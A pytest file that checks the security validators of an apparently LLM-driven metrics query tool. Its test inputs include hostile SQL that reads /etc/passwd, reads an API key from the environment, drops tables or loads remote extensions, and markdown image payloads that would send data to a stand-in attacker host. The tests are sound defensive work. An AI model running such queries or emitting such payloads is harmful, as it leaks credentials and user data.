import pytest

from signalstory.prom.engine import sql_query
from signalstory.prom.security import (
    RejectedQuery,
    plain_model_text,
    validate_promql,
    validate_question,
    validate_sql,
)


@pytest.mark.parametrize(
    "query",
    [
        "DROP TABLE samples",
        "SELECT 1; SELECT 2",
        "ATTACH '/tmp/secret' AS x",
        "SELECT * FROM read_csv('/etc/passwd')",
        "SELECT * FROM read_parquet('https://example.com/x')",
        "COPY samples TO '/tmp/out'",
        "INSTALL httpfs",
        "LOAD httpfs",
        "SET enable_external_access=true",
        "SELECT getenv('LLM_API_KEY')",
        "SELECT * FROM profiles",
        "SELECT * FROM other.snapshot",
        "SELECT * FROM sqlite_scan('/tmp/x', 'users')",
        "SELECT * FROM range(100000000000)",
        "WITH RECURSIVE x AS (SELECT 1 UNION ALL SELECT * FROM x) SELECT * FROM x",
        "SELECT value INTO hidden FROM samples",
        "UPDATE samples SET value=0",
        "SELECT * FROM glob('*')",
    ],
)
def test_rejects_privileged_sql(query):
    with pytest.raises(RejectedQuery):
        validate_sql(query)


def test_legitimate_cte_and_filter_work():
    query = "WITH a AS (SELECT service,value FROM snapshot WHERE metric='up' AND value=1) SELECT service,COUNT(*) FROM a GROUP BY service"
    result = sql_query(query)
    assert len(result["rows"]) == 2


def test_sql_output_limit():
    result = sql_query("SELECT * FROM samples")
    assert len(result["rows"]) == 200 and result["truncated"]


def test_question_and_range_limits():
    with pytest.raises(ValueError):
        validate_question("x" * 2501)
    with pytest.raises(RejectedQuery):
        validate_promql("rate(http_requests_total[365d])")
    assert validate_promql("rate(http_requests_total[5m])")


def test_model_markup_cannot_load_remote_images():
    clean = plain_model_text("![leak](https://example.com/secret)<script>alert(1)</script>")
    assert "https://" not in clean and "<script" not in clean and "![" not in clean


@pytest.mark.parametrize(
    "payload",
    [
        "![leak](https://bad.example/key)",
        "![leak][x]\n[x]: https://bad.example/key",
        "![leak]\n[leak]: https://bad.example/key",
    ],
)
def test_model_markdown_cannot_embed_remote_images(payload):
    from signalstory.prom.security import plain_model_text

    cleaned = plain_model_text(payload)
    assert "![" not in cleaned
    assert "https://bad.example" not in cleaned
